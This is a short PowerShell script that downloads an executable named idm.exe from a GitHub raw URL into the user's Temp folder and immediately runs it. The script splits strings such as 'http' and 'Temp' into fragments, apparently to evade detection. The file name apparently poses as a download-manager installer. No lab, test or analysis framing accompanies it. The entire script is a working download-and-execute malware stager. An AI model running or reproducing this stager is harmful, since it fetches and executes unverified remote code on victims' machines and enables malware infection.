$u = "h"+"t"+"t"+"p"+"://gi"+"thub.com/nahid0x1/nahid0x1.github.io/raw/refs/heads/main/test/idm.exe"; 
$o = "$($env:T"+"e"+"mp)\idm.exe"; 
$i = (New-Object Net.WebClient); 
$i.DownloadFile($u, $o); 
Start-Process -FilePath $o
